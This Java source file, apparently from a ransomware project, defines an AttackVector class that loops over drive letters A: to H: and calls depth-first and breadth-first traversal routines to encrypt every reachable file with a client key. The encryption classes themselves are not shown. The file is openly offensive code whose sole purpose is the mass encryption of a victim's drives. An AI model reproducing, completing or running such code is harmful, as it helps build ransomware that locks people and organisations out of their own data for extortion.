package Agent.Attack;

import java.io.File;
import java.util.Collection;
import java.util.Collections;

import Agent.entites.CryptoKey;
import Agent.traversal.*;

public class AttackVector {

	public void attack(String inputDir, Collection<File> dirs, CryptoKey key) {
		Traverse dfs = new DFS();
		dfs.traverseAndEncrypt(inputDir, dirs, key);
		// or
		Traverse bfs = new BFS();
		bfs.traverseAndEncrypt(inputDir, dirs, key);
	}

	public void encryptFileSystem(CryptoKey clientKey) throws Exception {

		Collection<File> visitedFolders = Collections.emptySet();
		for (char i = 'A'; i <= 'H'; i++) {
			attack(i + ":\\", visitedFolders, clientKey);

		}

	}
}
